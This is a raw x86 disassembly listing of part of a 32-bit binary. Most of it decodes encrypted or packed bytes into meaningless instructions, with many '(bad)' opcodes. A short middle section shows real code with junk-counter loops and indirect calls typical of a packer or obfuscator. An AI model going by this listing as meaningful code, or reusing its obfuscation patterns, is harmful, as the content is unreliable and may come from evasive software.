  413815:	xchg   BYTE PTR [ebx-0x21],bh
  413818:	xlat   BYTE PTR ds:[ebx]
  413819:	mov    cl,BYTE PTR [eax]
  41381b:	fiadd  WORD PTR [edi]
  41381d:	mov    bh,0x26
  41381f:	cdq    
  413820:	adc    ebx,ebp
  413822:	dec    eax
  413823:	lea    esi,[ecx]
  413825:	sub    bl,al
  413827:	mov    edx,0x1cfe4572
  41382c:	popa   
  41382d:	cli    
  41382e:	mov    ebx,0x8b9268cf
  413833:	sbb    esi,DWORD PTR [esi-0x8]
  413836:	mov    BYTE PTR [edi],bh
  413838:	jg     0x4138ae
  41383a:	and    BYTE PTR [ebx-0x1e],0xad
  41383e:	mov    esp,0x4a1d4b1b
  413843:	test   eax,0x8d5f6d71
  413848:	(bad)  
  413849:	(bad)  
  41384a:	(bad)  
  41384b:	xor    edi,DWORD PTR [esi-0x1f]
  41384e:	or     al,0x8e
  413850:	int    0x33
  413852:	fsub   DWORD PTR [ebx-0x3c3d69e0]
  413858:	sub    eax,0x4a5050cf
  41385d:	aam    0xb4
  41385f:	lea    edi,[edx+0x6403f229]
  413865:	xor    esp,DWORD PTR [ecx+0x5f7ac347]
  41386b:	aad    0xa0
  41386d:	es cmp al,0x63
  413870:	mov    dh,0x11
  413872:	jbe    0x413822
  413874:	cmp    eax,0xff2a04a7
  413879:	jb     0x4138e4
  41387b:	pop    edx
  41387c:	icebp  
  41387d:	into   
  41387e:	or     eax,0xd5bd35f2
  413883:	xchg   edx,eax
  413884:	ret    
  413885:	es aaa 
  413887:	xlat   BYTE PTR ds:[ebx]
  413888:	xlat   BYTE PTR ds:[ebx]
  413889:	push   esi
  41388a:	cdq    
  41388b:	and    al,BYTE PTR [edi+0x66]
  41388e:	aam    0xb3
  413890:	inc    esi
  413891:	sub    eax,DWORD PTR [esi-0x3793fc35]
  413897:	mov    al,0xe0
  413899:	sar    BYTE PTR [edx],cl
  41389b:	mov    bh,0x4f
  41389d:	sbb    BYTE PTR [ebx-0x6d7a6583],0x4f
  4138a4:	std    
  4138a5:	jne    0x41385b
  4138a7:	jb     0x413854
  4138a9:	in     al,0x77
  4138ab:	stos   BYTE PTR es:[edi],al
  4138ac:	jne    0x41388d
  4138ae:	(bad)  
  4138af:	mov    dh,0xa3
  4138b1:	push   0x43ee663f
  4138b6:	bound  eax,QWORD PTR [ebx]
  4138b8:	dec    ecx
  4138b9:	in     al,0x9
  4138bb:	mov    edi,0xcffef203
  4138c0:	sar    BYTE PTR [ebx],0x5d
  4138c3:	sti    
  4138c4:	je     0x413906
  4138c6:	jb     0x41388c
  4138c8:	adc    edx,edx
  4138ca:	mov    esp,0xe128d9e3
  4138cf:	popf   
  4138d0:	push   0xfffffff7
  4138d2:	popf   
  4138d3:	pop    ss
  4138d4:	xchg   edx,eax
  4138d5:	gs xor al,0x4e
  4138d8:	das    
  4138d9:	inc    eax
  4138da:	sub    ebx,DWORD PTR [edi+0x5c712523]
  4138e0:	sub    ebx,esi
  4138e2:	sti    
  4138e3:	mov    ah,0xb2
  4138e5:	mov    WORD PTR [ecx],gs
  4138e7:	or     dl,BYTE PTR [esi+0x7691f244]
  4138ed:	adc    eax,0x7dc92cb8
  4138f2:	push   0xc
  4138f4:	cmp    bl,BYTE PTR [ecx+0x77a63f0a]
  4138fa:	mov    edi,0xe369002f
  4138ff:	(bad)  [ecx-0x8]
  413902:	mov    ecx,0x6c34ed45
  413907:	push   esi
  413908:	mov    ebx,DWORD PTR [esi]
  41390a:	js     0x413971
  41390c:	or     al,0x7f
  41390e:	inc    edi
  41390f:	mov    DWORD PTR [ebx],esi
  413911:	jmp    0x413973
  413913:	inc    ebx
  413914:	lahf   
  413915:	push   esp
  413916:	ret    
  413917:	into   
  413918:	aas    
  413919:	pop    eax
  41391a:	retf   
  41391b:	mov    bl,0x38
  41391d:	add    al,0xe4
  41391f:	cwde   
  413920:	sbb    dh,BYTE PTR [esi+0x210afec1]
  413926:	add    DWORD PTR [eax],edi
  413928:	push   cs
  413929:	in     al,0xa
  41392b:	push   ss
  41392c:	inc    edi
  41392d:	repnz mov dh,0x35
  413930:	out    0x2b,al
  413932:	jnp    0x41391f
  413934:	lahf   
  413935:	aad    0x3f
  413937:	mov    al,ds:0xb4ea837e
  41393c:	iret   
  41393d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41393e:	cmp    ebp,edx
  413940:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413941:	jmp    0x4138f4
  413943:	clc    
  413944:	push   ebx
  413945:	outs   dx,BYTE PTR ds:[esi]
  413946:	add    BYTE PTR [ecx],0xca
  413949:	pop    edi
  41394a:	dec    edi
  41394b:	mov    eax,0xcac4c6ff
  413950:	xor    ebx,DWORD PTR [edx+0x1b310b43]
  413956:	sub    eax,0x7d7081d4
  41395b:	test   DWORD PTR [esi],ecx
  41395d:	out    0x10,eax
  41395f:	rcr    DWORD PTR [ebp-0x6e77501],cl
  413965:	dec    eax
  413966:	jmp    0xcf7cbd78
  41396b:	xor    ecx,DWORD PTR ds:0x81f626d3
  413971:	sub    DWORD PTR [ebp-0x7b],edi
  413974:	push   eax
  413975:	xchg   ebx,eax
  413976:	mov    dl,0x47
  413978:	daa    
  413979:	call   0x6137:0x2e8be082
  413980:	(bad)  
  413981:	in     eax,0xc3
  413983:	mov    esi,DWORD PTR [esi*8-0x4a2ee0cb]
  41398a:	(bad)  
  41398c:	dec    edi
  41398d:	inc    esp
  41398e:	outs   dx,DWORD PTR ds:[si]
  413990:	mov    ah,0xc6
  413992:	mov    eax,edi
  413994:	in     al,dx
  413995:	inc    ebp
  413996:	xchg   esp,eax
  413997:	lahf   
  413998:	sub    bl,bh
  41399a:	mov    dl,0x67
  41399c:	stos   BYTE PTR es:[edi],al
  41399d:	mov    bh,0x7a
  41399f:	(bad)  
  4139a0:	mov    bl,0xc5
  4139a2:	in     eax,dx
  4139a3:	or     ebx,edi
  4139a5:	push   ds
  4139a6:	dec    esi
  4139a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4139a8:	dec    edx
  4139a9:	imul   esp,DWORD PTR [esp+ebp*8-0x56f572f7],0x4b7325eb
  4139b4:	mov    al,0x69
  4139b6:	popf   
  4139b7:	sub    DWORD PTR [edi+0x71],eax
  4139ba:	jle    0x4139ad
  4139bc:	dec    BYTE PTR [ebx+0x34]
  4139bf:	add    al,BYTE PTR [ecx+edi*1]
  4139c2:	xor    edi,DWORD PTR [edx]
  4139c4:	mov    ds:0x34c1aa1f,eax
  4139c9:	sbb    bl,BYTE PTR [esi+eax*8-0x4bb4c5e3]
  4139d0:	sub    edx,DWORD PTR ss:[ebx-0x29240d71]
  4139d7:	xchg   ebx,eax
  4139d8:	mov    ds:0x994326e9,al
  4139dd:	adc    ah,BYTE PTR [edi]
  4139df:	les    esi,FWORD PTR [edx]
  4139e1:	jbe    0x413a23
  4139e3:	popf   
  4139e4:	stos   DWORD PTR es:[edi],eax
  4139e5:	sub    eax,0x2befa20b
  4139ea:	xor    BYTE PTR [ecx+0x74],dh
  4139ed:	gs mov dh,0x34
  4139f0:	mov    gs,WORD PTR [ecx-0x2cfe2903]
  4139f6:	and    al,0x99
  4139f8:	jns    0x413a78
  4139fa:	mov    edx,DWORD PTR [edi-0x31]
  4139fd:	loopne 0x413a44
  4139ff:	test   DWORD PTR [eax],ebp
  413a01:	bound  edi,QWORD PTR [eax+0x76]
  413a04:	inc    ebx
  413a05:	je     0x4139a7
  413a07:	adc    al,0x5
  413a09:	test   al,0xc4
  413a0b:	sub    ah,BYTE PTR [ecx-0x33]
  413a0e:	xchg   ecx,eax
  413a0f:	push   0xffffff82
  413a11:	sbb    eax,0x352381da
  413a16:	(bad)  
  413a17:	push   ss
  413a18:	or     eax,0xce19e609
  413a1d:	(bad)  
  413a1e:	fisttp DWORD PTR [edx]
  413a20:	xchg   DWORD PTR [ecx+0x31a3d916],edx
  413a26:	aad    0x28
  413a28:	push   eax
  413a29:	xor    eax,0x4d337ae0
  413a2e:	push   ecx
  413a2f:	sub    DWORD PTR [ecx+0x6e017587],ebp
  413a35:	mov    ch,0xd1
  413a37:	push   ebp
  413a38:	push   0xc82d088f
  413a3d:	xchg   edx,eax
  413a3e:	bound  eax,QWORD PTR [edx+0x14b041b6]
  413a44:	out    0xe2,eax
  413a46:	mov    ds:0xe50445ba,eax
  413a4b:	arpl   WORD PTR [edi-0x64],bp
  413a4e:	xor    bh,BYTE PTR [ebx-0x77]
  413a51:	call   0x40f7cd
  413a56:	jmp    0x413d3a
  413a5b:	pop    ebx
  413a5c:	ins    DWORD PTR es:[edi],dx
  413a5d:	and    al,0xa9
  413a5f:	xor    dh,BYTE PTR [ecx+0x71]
  413a62:	ins    DWORD PTR es:[edi],dx
  413a63:	jp     0x413a20
  413a65:	or     esi,ecx
  413a67:	adc    edx,DWORD PTR [edi+0x687ed44f]
  413a6d:	jo     0x413adf
  413a6f:	mov    ecx,0x5570707e
  413a74:	nop
  413a75:	jns    0x413aa3
  413a77:	mov    dh,0xd8
  413a79:	pop    edx
  413a7a:	xor    DWORD PTR [ebx-0x79],ebp
  413a7d:	push   eax
  413a7e:	fbstp  TBYTE PTR ds:0x3f46d623
  413a84:	mov    DWORD PTR [esi-0x48],eax
  413a87:	jp     0x413a66
  413a89:	pop    ds
  413a8a:	cmp    eax,0x6f34b0fe
  413a8f:	in     eax,dx
  413a90:	stos   BYTE PTR es:[edi],al
  413a91:	sar    bh,0x51
  413a94:	push   0x902fc584
  413a99:	cmp    DWORD PTR [edx+0x5bd0c8d1],ebp
  413a9f:	mov    cl,0xc8
  413aa1:	outs   dx,DWORD PTR ds:[esi]
  413aa2:	xchg   DWORD PTR [ecx+edx*8-0x85f3fbb],ecx
  413aa9:	aam    0x14
  413aab:	pop    edx
  413aac:	mov    ds:0xf1f0881f,al
  413ab1:	out    0x5a,eax
  413ab3:	and    al,0x6
  413ab5:	dec    esp
  413ab6:	shl    DWORD PTR ds:0xc96922cb,1
  413abc:	pop    edi
  413abd:	das    
  413abe:	xor    WORD PTR [eax+ecx*1+0x23e39c85],cx
  413ac6:	jmp    0x26f1e5f1
  413acb:	mov    esi,0x86dda163
  413ad0:	int3   
  413ad1:	xchg   ebx,eax
  413ad2:	or     eax,0x76110ce7
  413ad7:	cdq    
  413ad8:	adc    ebp,ebx
  413ada:	ds pop eax
  413adc:	ins    BYTE PTR es:[edi],dx
  413add:	mov    BYTE PTR [eax],cl
  413adf:	mov    dl,0x70
  413ae1:	adc    esp,DWORD PTR [edi+0x24453afe]
  413ae7:	in     eax,dx
  413ae8:	push   es
  413ae9:	push   ebx
  413aea:	or     al,0x74
  413aec:	dec    esi
  413aed:	fnstsw WORD PTR [edx+ecx*2+0x758ac972]
  413af4:	xor    DWORD PTR [edi],ecx
  413af6:	sbb    BYTE PTR [ecx+0x4c],dh
  413af9:	xchg   esp,eax
  413afa:	jg     0x413ad4
  413afc:	pop    edx
  413afd:	sbb    ebp,DWORD PTR [ebx-0x549f148d]
  413b03:	and    edx,esi
  413b05:	enter  0x2867,0xb0
  413b09:	in     al,dx
  413b0a:	push   es
  413b0b:	push   ebx
  413b0c:	xchg   esp,eax
  413b0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b0e:	js     0x413aae
  413b10:	cli    
  413b11:	push   edx
  413b12:	in     eax,0x9
  413b14:	cld    
  413b15:	dec    ebx
  413b16:	or     BYTE PTR [esi-0x7a],ah
  413b19:	cli    
  413b1a:	push   ebx
  413b1b:	xchg   ebx,eax
  413b1c:	dec    esp
  413b1d:	imul   eax,DWORD PTR [ebx+0x16],0xffffffdb
  413b21:	xchg   ecx,eax
  413b22:	out    dx,eax
  413b23:	aas    
  413b24:	inc    esi
  413b25:	in     al,dx
  413b26:	std    
  413b27:	mov    cs,WORD PTR [edx+0x5e]
  413b2a:	jnp    0x413b65
  413b2c:	ins    DWORD PTR es:[edi],dx
  413b2d:	enter  0xf52e,0xdb
  413b31:	mov    al,0x11
  413b33:	mov    DWORD PTR [eax],esp
  413b35:	and    BYTE PTR [esi+eax*4],bl
  413b38:	imul   ebp,DWORD PTR [edi+0x423264dc],0xe52ff324
  413b42:	add    BYTE PTR [eax],ch
  413b44:	adc    al,BYTE PTR [edi-0x7fce8e9d]
  413b4a:	push   edi
  413b4b:	xlat   BYTE PTR ds:[ebx]
  413b4c:	pop    DWORD PTR [edi+0x55]
  413b4f:	push   si
  413b51:	test   eax,0x5a6bea0a
  413b56:	in     al,dx
  413b57:	iret   
  413b58:	pop    eax
  413b59:	push   edi
  413b5a:	(bad)  
  413b5c:	fimul  DWORD PTR [edx-0x126def02]
  413b62:	mov    ?,WORD PTR [ebp+0x5f03ffcb]
  413b68:	imul   esi,DWORD PTR [edx+0x52],0x93040e0f
  413b6f:	xor    esp,DWORD PTR [edx]
  413b71:	es ja  0x413b1e
  413b74:	xor    eax,0x12319524
  413b79:	adc    eax,0x33440533
  413b7e:	rcl    DWORD PTR [edi+0x6c],cl
  413b81:	xor    DWORD PTR [eax+0x2e],esi
  413b84:	aas    
  413b85:	lods   al,BYTE PTR ds:[esi]
  413b86:	fwait
  413b87:	jbe    0x413bf2
  413b89:	lea    esi,[eax+0x71e8756a]
  413b8f:	pop    ebx
  413b90:	loop   0x413b73
  413b92:	out    dx,al
  413b93:	popf   
  413b94:	or     BYTE PTR ss:[edi+0x24],ah
  413b98:	sbb    DWORD PTR [ebx],ebx
  413b9a:	dec    ecx
  413b9b:	jae    0x413bbe
  413b9d:	xchg   edx,eax
  413b9e:	test   al,0xfa
  413ba0:	in     al,0xa5
  413ba2:	inc    eax
  413ba3:	mov    ebx,0xab479232
  413ba8:	mov    ds:0x8ab825fb,eax
  413bad:	and    ebx,DWORD PTR [ebp+0x31e7f280]
  413bb3:	fs cmc 
  413bb5:	xchg   ecx,eax
  413bb6:	or     al,0xa9
  413bb8:	out    0x25,al
  413bba:	hlt    
  413bbb:	iret   
  413bbc:	retf   
  413bbd:	or     BYTE PTR [esi+0x40],bh
  413bc0:	xor    ebx,esi
  413bc2:	xchg   BYTE PTR [ebx-0x2f],ch
  413bc5:	repnz repnz fidiv DWORD PTR [ecx+0x4e6c661c]
  413bcd:	repnz aaa 
  413bcf:	hlt    
  413bd0:	shl    DWORD PTR [edi+0x3d53f3ca],0x76
  413bd7:	push   ss
  413bd8:	xor    eax,0x4b6c5538
  413bdd:	in     eax,dx
  413bde:	dec    ecx
  413bdf:	aas    
  413be0:	inc    eax
  413be1:	mov    esp,0xb646f2cc
  413be6:	rcl    DWORD PTR [edi-0x10afe12e],0x6d
  413bed:	push   ecx
  413bee:	push   edx
  413bef:	in     eax,0xc4
  413bf1:	sbb    al,0xef
  413bf3:	enter  0x7df,0x11
  413bf7:	jge    0x413c2a
  413bf9:	test   eax,0x99552ff6
  413bfe:	popf   
  413bff:	icebp  
  413c00:	(bad)  
  413c01:	pusha  
  413c02:	in     al,dx
  413c03:	adc    ah,BYTE PTR [ebx+0x61038624]
  413c09:	dec    esi
  413c0a:	xchg   ebp,eax
  413c0b:	je     0x413bdc
  413c0d:	pop    eax
  413c0e:	fwait
  413c0f:	mov    ecx,0x2fa59a50
  413c14:	xor    al,BYTE PTR [edi+0x331a6854]
  413c1a:	jmp    0x413b9c
  413c1c:	sub    eax,0xf8059a78
  413c21:	adc    eax,0xcde918cd
  413c26:	call   0x8b1e:0xb4d2a9bc
  413c2d:	dec    ebx
  413c2e:	iret   
  413c2f:	pop    es
  413c30:	mov    eax,ds:0x3c923583
  413c35:	or     eax,0xc64b6fc3
  413c3a:	call   0x117aeffd
  413c3f:	and    al,0x6b
  413c41:	pop    ebx
  413c42:	inc    ebp
  413c43:	mov    edi,0x45615d55
  413c48:	arpl   dx,di
  413c4a:	fsubp  st(0),st
  413c4c:	and    eax,0xb553015a
  413c51:	stos   BYTE PTR es:[edi],al
  413c52:	and    eax,0x402d1a4e
  413c57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c58:	out    dx,eax
  413c59:	or     ah,bl
  413c5b:	sub    eax,0x9b9ab855
  413c60:	shr    DWORD PTR [edx],1
  413c62:	mov    edi,0x2edfd27c
  413c67:	cli    
  413c68:	add    eax,0x1b381273
  413c6d:	shl    edx,cl
  413c6f:	xchg   ecx,eax
  413c70:	or     BYTE PTR [edi+ecx*2-0x6a34c916],dl
  413c77:	jmp    0x79f5adea
  413c7c:	dec    ebx
  413c7d:	push   ss
  413c7e:	in     eax,0xf6
  413c80:	fild   DWORD PTR [edx+eiz*8-0x11]
  413c84:	and    DWORD PTR [edx+0x8b94638],eax
  413c8a:	push   ds
  413c8b:	add    DWORD PTR [esi+0x68],ebp
  413c8e:	fwait
  413c8f:	(bad)  
  413c90:	loop   0x413c50
  413c92:	mov    BYTE PTR [edi+0x39],bh
  413c95:	pop    ebp
  413c96:	dec    ebp
  413c97:	mov    eax,0x9bd55546
  413c9c:	js     0x413c3b
  413c9e:	adc    al,0x62
  413ca0:	cmp    al,0xcd
  413ca2:	add    DWORD PTR [edx+0x46602310],eax
  413ca8:	ret    
  413ca9:	cs xchg ebx,eax
  413cab:	push   esi
  413cac:	clc    
  413cad:	push   ebp
  413cae:	cmp    bl,BYTE PTR [eax-0x312dfac8]
  413cb4:	pushf  
  413cb5:	push   eax
  413cb6:	and    eax,0x4b658cf9
  413cbb:	xchg   edx,eax
  413cbc:	add    DWORD PTR [eax+0x7884e90e],edi
  413cc2:	aad    0x31
  413cc4:	(bad)  
  413cc5:	mov    ebp,0xe92fc496
  413cca:	call   0x16848f32
  413ccf:	pop    edi
  413cd0:	mov    eax,0xda28b2f1
  413cd5:	leave  
  413cd6:	inc    esp
  413cd7:	fs adc bh,ch
  413cda:	shl    BYTE PTR [edx-0x2d],0x44
  413cde:	xchg   ecx,eax
  413cdf:	xor    edi,DWORD PTR [ebx+0x7831a27d]
  413ce5:	test   DWORD PTR [ecx+0x74],ecx
  413ce8:	xchg   ebp,eax
  413ce9:	out    dx,al
  413cea:	mov    dl,0xa8
  413cec:	lea    ecx,[ecx-0x11]
  413cef:	sbb    di,bx
  413cf2:	push   ds
  413cf3:	mov    DWORD PTR [edi],ecx
  413cf5:	ins    DWORD PTR es:[edi],dx
  413cf6:	iret   
  413cf7:	repnz adc al,0xf2
  413cfa:	sar    BYTE PTR [edi-0x5d],1
  413cfd:	aad    0x9b
  413cff:	sbb    BYTE PTR [esi+0x1025782e],cl
  413d05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d06:	sar    DWORD PTR [ebp+0x5a],1
  413d09:	xchg   ecx,eax
  413d0a:	sub    BYTE PTR [eax+0x6f],al
  413d0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d0e:	push   ds
  413d0f:	xlat   BYTE PTR ds:[ebx]
  413d10:	sti    
  413d11:	retf   
  413d12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d14:	pop    esi
  413d15:	mov    BYTE PTR ds:0x66309434,dl
  413d1b:	retf   0x5638
  413d1e:	sbb    eax,ecx
  413d20:	pop    ebx
  413d21:	aaa    
  413d22:	dec    esi
  413d23:	sbb    al,0x32
  413d25:	cmp    BYTE PTR [edx-0x17ead16f],bl
  413d2b:	xor    ah,bl
  413d2d:	mov    esp,0xedbbebbe
  413d32:	lock sub dl,BYTE PTR [ebx]
  413d35:	add    ch,ah
  413d37:	dec    eax
  413d38:	rol    DWORD PTR [ecx-0x77],cl
  413d3b:	inc    ebp
  413d3c:	loopne 0x413cc9
  413d3e:	inc    ebp
  413d3f:	cld    
  413d40:	sub    ecx,ecx
  413d42:	mov    ecx,DWORD PTR [ebp-0x20]
  413d45:	mov    DWORD PTR ds:0x42e77f,0x1b
  413d4f:	cmp    DWORD PTR ds:0x42e77f,0x0
  413d56:	je     0x413dab
  413d5c:	cmp    DWORD PTR ds:0x42e77f,0x2
  413d63:	jne    0x413d7f
  413d69:	push   DWORD PTR [ebp-0xc]
  413d6c:	push   0x52a1
  413d71:	push   0x824e
  413d76:	push   DWORD PTR [ebp-0x18]
  413d79:	call   DWORD PTR ds:0x42e5eb
  413d7f:	cmp    DWORD PTR ds:0x42e77f,0x3
  413d86:	jne    0x413d99
  413d8c:	mov    esi,DWORD PTR ds:0x42e77f
  413d92:	dec    esi
  413d93:	mov    DWORD PTR ds:0x42e77f,esi
  413d99:	mov    esi,DWORD PTR ds:0x42e77f
  413d9f:	dec    esi
  413da0:	mov    DWORD PTR ds:0x42e77f,esi
  413da6:	jmp    0x413d4f
  413dab:	mov    esi,0x7510855
  413db0:	or     DWORD PTR ds:0x42e78f,0x42fe06
  413dba:	xor    eax,esi
  413dbc:	add    eax,ebx
  413dbe:	cmp    ecx,eax
  413dc0:	mov    DWORD PTR ds:0x42e1ac,0x588b
  413dca:	je     0x414b4e
  413dd0:	push   DWORD PTR [ebp-0x20]
  413dd3:	dec    DWORD PTR ds:0x42e777
  413dd9:	push   DWORD PTR [ebp+0x8]
  413ddc:	xor    DWORD PTR ds:0x42fd59,0x42e1a0
  413de6:	call   0x405485
  413deb:	mov    DWORD PTR [ebp-0x14],eax
  413dee:	and    DWORD PTR ds:0x42e77b,0x0
  413df8:	jmp    0x413e08
  413dfd:	mov    eax,ds:0x42e77b
  413e02:	inc    eax
  413e03:	mov    ds:0x42e77b,eax
  413e08:	cmp    DWORD PTR ds:0x42e77b,0x10
  413e0f:	jae    0x413e33
  413e15:	cmp    DWORD PTR ds:0x42e77b,0x16
  413e1c:	jne    0x413e28
  413e22:	call   DWORD PTR ds:0x42e50b
  413e28:	jmp    0x413dfd
  413e2d:	sub    DWORD PTR ds:0x42fd81,ecx
  413e33:	mov    eax,DWORD PTR [ebp-0x4]
  413e36:	or     DWORD PTR ds:0x42e777,edx
  413e3c:	mov    ecx,DWORD PTR [ebp-0x14]
  413e3f:	adc    DWORD PTR ds:0x42fe0a,0x2715
  413e49:	xor    eax,esi
  413e4b:	dec    DWORD PTR ds:0x42e783
  413e51:	add    eax,ebx
  413e53:	mov    DWORD PTR ds:0x42e19c,0x499a
  413e5d:	cmp    ecx,eax
  413e5f:	je     0x414b4e
  413e65:	not    eax
  413e67:	mov    eax,DWORD PTR [ebp-0x14]
  413e6a:	mov    eax,DWORD PTR [eax+0x18]
  413e6d:	mov    DWORD PTR [ebp-0x20],eax
  413e70:	xor    DWORD PTR ds:0x42e77b,0x4f5
  413e7a:	jmp    0x41415e
  413e7f:	lods   al,BYTE PTR ds:[esi]
  413e80:	mov    WORD PTR [edx],gs
  413e82:	loopne 0x413eae
  413e84:	outs   dx,BYTE PTR ds:[esi]
  413e85:	push   0x4c
  413e87:	repz push edi
  413e89:	scas   eax,DWORD PTR es:[edi]
  413e8a:	pop    DWORD PTR [esi+0x47fadeaa]
  413e90:	jbe    0x413f02
  413e92:	jo     0x413e4d
  413e94:	jle    0x413f06
  413e96:	jo     0x413ef2
  413e98:	fcmovu st,st(7)
  413e9a:	pop    ebx
  413e9b:	pop    edx
  413e9c:	div    DWORD PTR ds:[ebx]
  413e9f:	ins    DWORD PTR es:[edi],dx
  413ea0:	add    eax,0xbc639072
  413ea5:	jle    0x413ef3
  413ea7:	sti    
  413ea8:	stos   BYTE PTR es:[edi],al
  413ea9:	mov    ds:0x4c49057a,al
  413eae:	jp     0x413f1e
  413eb0:	inc    edx
  413eb1:	mov    ds:0x2f5c3f61,eax
  413eb6:	lods   al,BYTE PTR ds:[esi]
  413eb7:	mov    ?,WORD PTR [edx]
  413eb9:	jns    0x413ef2
  413ebb:	inc    esi
  413ebc:	push   0x2fffd73
  413ec1:	or     al,0xc4
  413ec3:	loope  0x413e48
  413ec5:	adc    al,0x80
  413ec7:	xor    DWORD PTR [ecx],0xfdde5411
  413ecd:	pop    ecx
  413ece:	sbb    eax,0x33e8eb61
  413ed3:	jg     0x413f15
  413ed5:	push   edx
  413ed6:	inc    esi
  413ed7:	inc    ecx
  413ed8:	xlat   BYTE PTR ds:[ebx]
  413ed9:	repz fwait
  413edb:	cmp    cl,cl
  413edd:	mov    ebp,0xb9f4da14
  413ee2:	xor    cl,ah
  413ee4:	imul   ebx,DWORD PTR [eax-0x4b],0x48c552c
  413eeb:	shl    BYTE PTR [eax-0x6cd67a36],1
  413ef1:	sahf   
  413ef2:	jbe    0x413ef6
  413ef4:	inc    esp
  413ef5:	loopne 0x413f74
  413ef7:	repnz pop ss
  413ef9:	pop    ebp
  413efa:	dec    ebp
  413efb:	xchg   edi,eax
  413efc:	pop    ss
  413efd:	xor    edi,eax
  413eff:	push   cs
  413f00:	and    ch,dl
  413f02:	cli    
  413f03:	int3   
  413f04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f05:	ret    
  413f06:	or     bh,BYTE PTR [ecx-0x142c54fe]
  413f0c:	xchg   edx,eax
  413f0d:	sahf   
  413f0e:	cmp    eax,0xf772a7da
  413f13:	jecxz  0x413f4e
  413f15:	cli    
  413f16:	iret   
  413f17:	out    dx,al
  413f18:	aam    0x25
  413f1a:	rcl    DWORD PTR [ebx],1
  413f1c:	(bad)  
  413f1d:	div    DWORD PTR [eax]
  413f1f:	and    al,0xe
  413f21:	add    eax,0x2c46f8ca
  413f26:	pop    esi
  413f27:	cld    
  413f28:	jnp    0x413f86
  413f2a:	pop    eax
  413f2b:	fsubp  st(4),st
  413f2d:	or     DWORD PTR [ecx-0x5fc775db],edi
  413f33:	jmp    0x413f60
  413f35:	mov    ch,0x41
  413f37:	push   edi
  413f38:	repnz mul ebx
  413f3b:	out    dx,eax
  413f3c:	loope  0x413f90
  413f3e:	inc    esp
  413f3f:	mov    esp,0xf6483e42
  413f44:	and    eax,0xb121efa8
  413f49:	gs push cs
  413f4b:	push   cs
  413f4c:	pop    eax
  413f4d:	je     0x413f32
  413f4f:	jns    0x413fcb
  413f51:	iret   
  413f52:	push   es
  413f53:	add    esp,DWORD PTR [ebx]
  413f55:	and    cl,BYTE PTR [eax-0x37f15e1e]
  413f5b:	push   ebx
  413f5c:	aam    0x56
  413f5e:	aad    0x2a
  413f60:	adc    dl,ah
  413f62:	fcomp  st(0)
  413f64:	mov    WORD PTR [esi],ds
  413f66:	retf   0x4038
  413f69:	je     0x413f50
  413f6b:	out    0xae,al
  413f6d:	cmp    BYTE PTR ds:0x9c72715e,dl
  413f73:	sbb    BYTE PTR [esi+ebx*1+0x2],bl
  413f77:	add    al,0x5f
  413f79:	std    
  413f7a:	das    
  413f7b:	pop    esp
  413f7c:	and    BYTE PTR [ebp+0x53080ef9],bl
  413f82:	push   ds
  413f83:	inc    edx
  413f84:	shl    ch,0x90
  413f87:	outs   dx,BYTE PTR ds:[esi]
  413f88:	mov    eax,ds:0x8ad3be26
  413f8d:	ds test eax,0xaa1925df
  413f93:	es js  0x413f16
  413f96:	jb     0x413f49
  413f98:	hlt    
  413f99:	add    al,0xc0
  413f9b:	inc    esi
  413f9c:	add    bh,BYTE PTR [ebx+edx*1+0x3]
  413fa0:	mov    ah,0x6b
  413fa2:	push   ss
  413fa3:	ins    DWORD PTR es:[edi],dx
  413fa4:	lahf   
  413fa5:	sbb    DWORD PTR [edi],0x29
  413fa8:	repnz loop 0x413f72
  413fab:	mov    edx,0xfd03f90e
  413fb0:	and    al,0xdf
  413fb2:	sbb    al,dh
  413fb4:	dec    ebp
  413fb5:	mov    al,ds:0xfe3da173
  413fba:	bound  edx,QWORD PTR [esi+ebx*1+0x4422e4]
  413fc1:	jge    0x413ffc
  413fc3:	jnp    0x413ffa
  413fc5:	outs   dx,DWORD PTR ds:[esi]
  413fc6:	lock mov ebp,0xf557ba97
  413fcc:	cmp    DWORD PTR [ecx-0x3da6f21a],ecx
  413fd2:	call   0xc027:0xb5035cf2
  413fd9:	and    al,0x4c
  413fdb:	push   ebx
  413fdc:	push   edi
  413fdd:	sub    al,0x57
  413fdf:	jp     0x413f82
  413fe1:	or     dh,BYTE PTR [ebp-0xb]
  413fe4:	push   ss
  413fe5:	xchg   BYTE PTR [edx-0x3e],ah
  413fe8:	test   BYTE PTR cs:[ecx+0x3f],bl
  413fec:	jno    0x413f87
  413fee:	outs   dx,BYTE PTR ds:[esi]
  413fef:	add    BYTE PTR [esi],bl
  413ff1:	jo     0x414068
  413ff3:	push   0xffffffe5
  413ff5:	push   ebx
  413ff6:	or     al,0xd8
  413ff8:	arpl   WORD PTR [eax],sp
  413ffa:	xchg   esi,eax
  413ffb:	fdivr  DWORD PTR ds:0x4baae60
  414001:	xor    al,0x20
  414003:	ja     0x414070
  414005:	loopne 0x414033
  414007:	sub    eax,0x4d60e229
  41400c:	xchg   esp,eax
  41400d:	pop    ecx
  41400e:	pop    es
  41400f:	ror    BYTE PTR [edi],1
  414011:	and    DWORD PTR [ebx+0x59],ecx
  414014:	sbb    cl,BYTE PTR ds:[eax]
  414017:	dec    ebp
  414018:	jmp    0xa43b:0x8aff70d5
  41401f:	shr    DWORD PTR ds:0x5261577,cl
  414025:	in     al,dx
  414026:	jp     0x414035
  414028:	or     ah,BYTE PTR [ecx]
  41402a:	push   ss
  41402b:	(bad)  
  41402c:	mov    ecx,0xcc6ed249
  414031:	fidivr WORD PTR [esi+ebp*4+0x24]
  414035:	imul   eax,DWORD PTR [eax+0x1f],0x99b4b47c
  41403c:	cmp    al,0xa6
  41403e:	test   eax,0x5787e16e
  414043:	ret    0x6e1
  414046:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414047:	aam    0xbc
  414049:	mov    ch,0xbc
  41404b:	or     DWORD PTR [esi-0x5f531770],ebx
  414051:	mov    al,ds:0x805ac67c
  414056:	and    al,0xa5
  414058:	push   eax
